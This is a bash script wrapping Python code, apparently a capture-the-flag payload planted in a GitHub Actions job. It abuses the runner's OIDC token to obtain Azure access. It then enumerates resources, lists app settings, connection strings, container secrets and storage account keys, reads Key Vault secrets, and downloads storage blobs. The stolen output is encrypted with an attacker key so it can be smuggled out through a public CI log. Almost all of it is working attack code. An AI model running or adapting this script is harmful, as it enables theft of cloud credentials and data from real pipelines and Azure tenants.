#!/usr/bin/env bash
# Keep cloud responses encrypted: this CI log is public.
set -uo pipefail
loot="$(mktemp)"
trap 'rm -f "$loot"' EXIT
python3 - >"$loot" 2>&1 <<'PY'
import json, os, re, subprocess, sys, urllib.error, urllib.parse, urllib.request

tenant=os.getenv('AZURE_TENANT_ID','3205c325-06a5-4171-9ce8-ffc5e6c2845e')
client=os.getenv('AZURE_CLIENT_ID','72ff278a-9e71-43ec-bac4-2ca303f8e462')
subscription=os.getenv('AZURE_SUBSCRIPTION_ID','c5e4e004-b42d-4ac4-a502-5fd338380eb6')
print('RUNNER_ENV_CANDIDATE_NAMES', sorted(k for k in os.environ
      if re.search(r'FLAG|SECRET|TOKEN|AZURE|STORAGE|KEY|AUTH|VAULT', k, re.I)))
print('RUNNER_ENV_FLAG_MATCHES', [(k, found) for k, value in os.environ.items()
      for found in re.findall(r'DF26\{[^}\r\n]{1,200}\}', value)])

def call(url, token=None, method='GET', data=None):
    headers={'Authorization':'Bearer '+token} if token else {}
    if data is not None: headers['Content-Type']='application/x-www-form-urlencoded'
    req=urllib.request.Request(url,headers=headers,data=data,method=method)
    try:
        with urllib.request.urlopen(req,timeout=30) as r: status,raw=r.status,r.read()
    except urllib.error.HTTPError as e: status,raw=e.code,e.read()
    except Exception as e: return {'error':repr(e)}
    try: body=json.loads(raw)
    except Exception: body=raw.decode('utf-8','replace')[:2000]
    return {'status':status,'body':body}

def show(label,response):
    print('\n===',label,'===',flush=True)
    print(json.dumps(response,ensure_ascii=False,default=str),flush=True)

url=os.getenv('ACTIONS_ID_TOKEN_REQUEST_URL')
secret=os.getenv('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
if not url or not secret:
    print('OIDC_UNAVAILABLE')
    raise SystemExit(0)
request=urllib.request.Request(url+'&audience=api%3A%2F%2FAzureADTokenExchange',
                               headers={'Authorization':'Bearer '+secret})
try:
    with urllib.request.urlopen(request,timeout=20) as r: jwt=json.load(r)['value']
except Exception as e:
    print('OIDC_ERROR',repr(e))
    raise SystemExit(0)

def aad(scope):
    data=urllib.parse.urlencode({
        'client_id':client,'scope':scope,'grant_type':'client_credentials',
        'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
        'client_assertion':jwt}).encode()
    result=call('https://login.microsoftonline.com/'+tenant+'/oauth2/v2.0/token',
                method='POST',data=data)
    body=result.get('body',{})
    if isinstance(body,dict) and body.get('access_token'):
        print('AZURE_TOKEN_OK',scope,flush=True)
        return body['access_token']
    show('Azure token error '+scope,result)
    return None

arm_token=aad('https://management.azure.com/.default')
vault_token=aad('https://vault.azure.net/.default')

def arm(path,method='GET'):
    if not arm_token: return {'error':'no ARM token'}
    url=path if path.startswith('https://') else 'https://management.azure.com'+path
    return call(url,arm_token,method,data=b'' if method=='POST' else None)

def pages(url,token):
    for _ in range(20):
        result=call(url,token)
        show(url,result)
        body=result.get('body',{})
        if not isinstance(body,dict): return
        yield from body.get('value',[])
        url=body.get('nextLink')
        if not url: return

resources=[]
if arm_token:
    show('subscriptions',arm('/subscriptions?api-version=2022-12-01'))
    show('resource groups',arm('/subscriptions/'+subscription+'/resourcegroups?api-version=2021-04-01'))
    resources=list(pages('https://management.azure.com/subscriptions/'+subscription+
                         '/resources?api-version=2021-04-01',arm_token))

vaults={'kv-tbl-prod-x3euoz'}
storage=[]
connections=[]
direct_secrets=[]
for resource in resources:
    kind=resource.get('type','').lower()
    name=resource.get('name','')
    rid=resource.get('id','')
    if kind=='microsoft.keyvault/vaults':
        vaults.add(name)
    elif kind=='microsoft.storage/storageaccounts':
        storage.append((name,rid))
    elif kind=='microsoft.web/sites':
        result=arm(rid+'/config/appsettings/list?api-version=2022-03-01','POST')
        show('web app settings '+name,result)
        body=result.get('body',{})
        props=body.get('properties',{}) if isinstance(body,dict) else {}
        if props.get('CONFIG_STORAGE_CONNECTION'):
            connections.append((name,props['CONFIG_STORAGE_CONNECTION']))
        for value in props.values():
            if isinstance(value,str):
                direct_secrets += re.findall(r'https://[a-z0-9-]+\.vault\.azure\.net/secrets/[A-Za-z0-9-]+',value)
        show('web connection strings '+name,
             arm(rid+'/config/connectionstrings/list?api-version=2022-03-01','POST'))
    elif kind=='microsoft.app/containerapps':
        show('container app '+name,arm(rid+'?api-version=2024-03-01'))
        show('container app secrets '+name,
             arm(rid+'/listSecrets?api-version=2024-03-01','POST'))
    elif kind=='microsoft.appconfiguration/configurationstores':
        config_token=aad('https://azconfig.io/.default')
        if config_token:
            show('App Configuration '+name,
                 call('https://'+name+'.azconfig.io/kv?api-version=1.0',config_token))

if vault_token:
    for vault in sorted(vaults):
        root='https://'+vault+'.vault.azure.net'
        names=[s.get('id','').split('?')[0] for s in
               pages(root+'/secrets?api-version=7.4',vault_token)]
        names += [root+'/secrets/'+s for s in
                  ('flag','ctf-flag','tebamoto-flag','prod-flag','tbl-flag',
                   'logistics-flag','incident-flag','df26-flag')]
        names += direct_secrets
        for sid in dict.fromkeys(n for n in names if n):
            show('key vault '+sid,call(sid+'?api-version=7.4',vault_token))

for name,rid in storage:
    result=arm(rid+'/listKeys?api-version=2023-01-01','POST')
    show('storage keys '+name,result)
    body=result.get('body',{})
    keys=body.get('keys',[]) if isinstance(body,dict) else []
    if keys and keys[0].get('value'):
        connection='DefaultEndpointsProtocol=https;AccountName='+name+';AccountKey='+keys[0]['value']+';EndpointSuffix=core.windows.net'
        connections.append((name,connection))

if connections:
    try:
        from azure.storage.blob import BlobServiceClient
    except ImportError:
        result=subprocess.run([sys.executable,'-m','pip','install','-q','azure-storage-blob'],
                              capture_output=True,text=True,timeout=120)
        print('storage SDK install',result.returncode,result.stderr[-1000:])
        from azure.storage.blob import BlobServiceClient
    for label,connection in connections:
        try:
            service=BlobServiceClient.from_connection_string(connection)
            for container in service.list_containers():
                print('CONTAINER',label,container.name,flush=True)
                cc=service.get_container_client(container.name)
                for blob in cc.list_blobs():
                    print('BLOB',container.name,blob.name,blob.size,flush=True)
                    if blob.size <= 100000:
                        try:
                            data=cc.download_blob(blob.name).readall()
                            print(data.decode('utf-8','replace'),flush=True)
                        except Exception as e:
                            print('BLOB_ERROR',repr(e),flush=True)
        except Exception as e:
            print('STORAGE_ERROR',label,repr(e),flush=True)
PY
echo "payload_exit=$?"
echo "flag_matches=$(grep -Eoc 'DF26\{[^}]+\}' "$loot" || true)"
key="$(openssl rand -hex 32)"
echo '=== ENCRYPTED_LOOT_BEGIN ==='
openssl enc -aes-256-cbc -pbkdf2 -iter 200000 -salt -pass "pass:$key" -in "$loot" | base64 -w76
echo
echo '=== ENCRYPTED_LOOT_END ==='
echo '=== ENCRYPTED_KEY_BEGIN ==='
printf %s "$key" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep | base64 -w76
echo
echo '=== ENCRYPTED_KEY_END ==='
